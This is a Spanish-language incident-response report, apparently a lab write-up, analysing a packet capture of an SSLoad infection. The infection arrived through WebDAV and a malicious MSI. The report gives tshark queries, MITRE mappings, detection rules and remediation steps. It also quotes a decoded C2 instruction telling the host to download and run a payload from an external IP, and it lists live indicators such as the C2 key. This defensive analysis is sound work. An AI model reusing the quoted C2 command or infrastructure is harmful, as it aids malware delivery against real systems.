### [HTB_INTERCEPTOR] — Informe Técnico de SOC & Threat Hunting

**Clasificación:** TLP:AMBER (Uso Interno — SOC / Incident Response)  
**Plataforma / Entorno:** Wireshark / Tshark / PCAP Network Forensics / Splunk Enterprise ES  
**Objetivo / Infraestructura:** Host interno DESKTOP-FWQ3U4C (10.4.17.101) / Tráfico Perimetral HTTP/WebDAV

#### 1. Escenario y Contexto de la Amenaza

- **Resumen Ejecutivo:** Se investigó una alerta de seguridad por tráfico de red altamente anómalo originado desde la estación de trabajo 10.4.17.101. El análisis pericial del archivo interceptor.pcap reveló una intrusión por malware mediante el abuso de extensiones WebDAV y la descarga de un paquete MSI malicioso (avp.msi) desde la dirección IP externa 85.239.53.219. La ejecución del instalador a través de msiexec.exe condujo a la extracción y ejecución de una biblioteca de enlace dinámico (forcedelctl.dll), vinculada a la familia de malware **SSLoad**. La muestra perfiló el sistema operativo (Windows 6.3.9600, usuario Nevada), validó conectividad pública contra api.ipify.org, y estableció comunicación C2 cifrada por API HTTP portando comandos de ejecución remota de segundas etapas.
    
- **Fuentes de Telemetría y Contenido del Dataset:** Captura de paquetes crudos interceptor.pcap (11 MiB). Inspección de protocolos DNS, HTTP (métodos PROPFIND, GET, POST) y SMB/Browser broadcast. Delimitación temporal: tráfico de red capturado durante la fase de acceso inicial y balizamiento C2.
    

#### 2. Mapeo Táctico MITRE ATT&CK®

|   |   |   |   |
|---|---|---|---|
|Táctica|ID Técnica / Subtécnica|Nombre de la Técnica|Evidencia / Log Específico Hallado|
|**Initial Access / Execution**|T1218.007|System Binary Proxy Execution: Msiexec|Ejecución del paquete malicioso avp.msi mediante el binario legítimo C:\Windows\system32\msiexec.exe.|
|**Discovery**|T1082|System Information Discovery|El malware recopiló y transmitió el hostname DESKTOP-FWQ3U4C, usuario Nevada y versión del OS Windows 6.3.9600.|
|**Discovery**|T1016|System Network Configuration Discovery|Consultas DNS y peticiones HTTP contra api.ipify.org para determinar la IP pública de salida.|
|**Discovery**|T1083|File and Directory Discovery|Uso del método HTTP WebDAV PROPFIND para enumerar propiedades de archivos en el servidor remoto.|
|**Command and Control**|T1071.001|Application Layer Protocol: Web Protocols|Comunicaciones HTTP estructuradas contra 85.239.53.219 empleando API keys y comandos en Base64.|
|**Command and Control**|T1573.001|Encrypted Channel: Symmetric Cryptography|Canales C2 protegidos con clave de autenticación simétrica WkZPxBoH6CA3Ok4iI.|

#### 3. Cadena de Investigación Forense y Análisis de Telemetría

- **Hipótesis de Búsqueda:** Identificar la IP interna con mayor volumen de paquetes y anomalías en resoluciones DNS o conexiones no estándar.
    
- **Consultas y Comandos Operativos:**
    


``` bash
tshark -r interceptor.pcap -q -z conv,ip
tshark -r interceptor.pcap -Y "browser" -T fields -e ip.src -e browser.server
```

- **Desglose Técnico de Evidencias:**
    
    - La dirección IP **10.4.17.101** concentró la mayoría de las transferencias.
        
    - La máquina se anunció en la red mediante broadcasts SMB/Browser al destino 10.4.17.255, confirmando su nombre de equipo: **DESKTOP-FWQ3U4C**.
        

- **Hipótesis de Búsqueda:** Aislar transacciones HTTP que involucren métodos de extensión WebDAV utilizados para reconocimiento y descarga de ejecutables.
    
- **Consultas y Comandos Operativos:**
    


``` bash
tshark -r interceptor.pcap -Y "http.request.method == \"PROPFIND\" || http.request.uri contains \".msi\"" -T fields -e frame.number -e ip.src -e ip.dst -e http.request.method -e http.request.uri
```

- **Desglose Técnico de Evidencias:**
    
    - El atacante operó desde la IP **85.239.53.219**, interactuando con la víctima mediante el método HTTP **PROPFIND** para explorar metadatos y propiedades de archivos.
        
    - Se materializó la descarga del archivo **avp.msi** (camuflado bajo la nomenclatura de instaladores de software de seguridad legítimo).
        
    - El instalador fue invocado por el binario del sistema **C:\Windows\system32\msiexec.exe**.
        

- **Hipótesis de Búsqueda:** Analizar los objetos contenidos en el contenedor MSI para identificar bibliotecas de enlace dinámico secundarias.
    
- **Consultas y Comandos Operativos:**
    


``` bash
tshark -r interceptor.pcap --export-objects "http,./extracted_http"
sha256sum extracted_http/avp.msi
```

- **Desglose Técnico de Evidencias:**
    
    - El hash criptográfico del instalador arrojó coincidencias con la familia de malware **ssload**.
        
    - **Hash SSDEEP:** 24576:BqKxnNTYUx0ECIgYmfLVYeBZr7A9zdfoAX+8UhxcS:Bq6TYCZKumZr7ARdAAO8oxz.
        
    - **Fecha de Compilación (Compile Timestamp):** 2009-12-11 11:47:44 UTC (marca temporal manipulada/antigua para evasión).
        
    - **DLL Extraída y Ejecutada:** Dentro del archivo empaquetado (junto a disk1.cab y Binary.aicustact.dll), la carga maliciosa real correspondió a la librería **forcedelctl.dll**.
        

- **Hipótesis de Búsqueda:** Reconstruir el stream TCP del balizamiento C2 y descifrar las instrucciones transmitidas por el servidor remoto.
    
- **Consultas y Comandos Operativos:**
    


``` bash
tshark -r interceptor.pcap -Y "http.request.method == \"POST\" && ip.dst == 85.239.53.219" -T fields -e text
```

- **Desglose Técnico de Evidencias:**
    
    - **Verificación Externa:** El malware generó consultas DNS hacia el dominio **api.ipify.org** para validar su IP pública de egreso.
        
    - **Autenticación en la API C2:** Las peticiones POST incluyeron la clave de autorización: **WkZPxBoH6CA3Ok4iI**.
        
    - **Perfil del Sistema Exfiltrado:** La telemetría HTTP expuso el usuario **Nevada** y la versión de kernel **Windows 6.3.9600** (Windows 8.1 / Windows Server 2012 R2).
        
    - **Instrucción Decodificada (Base64/C2 Stream):**
        


``` Json
{"command": "exe", "args": ["http://85.239.53.219/download?id=Nevada&module=2&filename=None"]}
```

- **Resultado de la Ejecución:** La petición posterior de descarga del ejecutable secundario retornó un error **500 Internal Server Error** (Server got itself in trouble), deteniendo la cadena antes del despliegue del módulo final.
    

#### 4. Ingeniería de Detección (Reglas de Alerta & Correlación)


``` Suricata
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"SOC - Deteccion de Balizamiento C2 SSLoad / Clave de Autenticacion"; flow:to_server,established; http.method; content:"POST"; http.request_body; content:"WkZPxBoH6CA3Ok4iI"; fast_pattern; classtype:trojan-activity; sid:20260401; rev:1;)
```

- **Consideraciones de Falso Positivo:** Prácticamente nulas debido a la alta entropía y especificidad del token estático WkZPxBoH6CA3Ok4iI.
    
- **Tuning:** Asegurar que el buffer http.request_body esté configurado con profundidad suficiente en suricata.yaml para inspeccionar el cuerpo de peticiones POST no cifradas.
    


``` SPL
index=win_servers EventCode=1 Image="*\\msiexec.exe" (CommandLine="*http*" OR CommandLine="*\\*@SSL*" OR CommandLine="*\\*@80*" OR CommandLine="*\\AppData\\Local\\Temp*")
| stats count min(_time) as primer_evento max(_time) as ultimo_evento values(CommandLine) as lineas_comando by Computer, User, ParentImage
| convert ctime(primer_evento) ctime(ultimo_evento)
| table primer_evento, ultimo_evento, Computer, User, ParentImage, lineas_comando, count
```

- **Consideraciones de Falso Positivo:** Despliegues de software corporativo automatizados vía SCCM o GPO.
    
- **Tuning:** Filtrar cuentas de servicio de despliegue autorizadas (SYSTEM, svc_deploy) y rutas SMB corporativas internas confiables.
    

#### 5. Recomendaciones de Contención, Remedición y Hardening

1. **Aislamiento de Red:** Desconectar lógicamente el host 10.4.17.101 mediante el aislamiento host-level del agente EDR.
    
2. **Bloqueo Perimetral de IOCs:**
    
    - Bloquear el tráfico bidireccional hacia la dirección IP C2 **85.239.53.219** en los cortafuegos perimetrales.
        
    - Denegar la resolución del dominio de prueba api.ipify.org o monitorizar picos atípicos en endpoints de usuario.
        
3. **Erradicación en Endpoint:** Localizar y purgar el archivo avp.msi y cualquier remanente de forcedelctl.dll en los directorios temporales de Windows y del perfil de usuario Nevada.
    

4. **Restricción de Ejecución con AppLocker / WDAC:** Bloquear la ejecución arbitraria de paquetes Windows Installer (.msi) provenientes de zonas no confiables (Marcado de la Web - MotW) y restringir el uso de msiexec.exe para usuarios estándar.
    
5. **Deshabilitación del Cliente WebDAV:** Deshabilitar el servicio WebClient (WebClient Service) en las estaciones de trabajo cliente mediante directiva de grupo (GPO) para anular vectores de conexión WebDAV hacia servidores externos.
    

---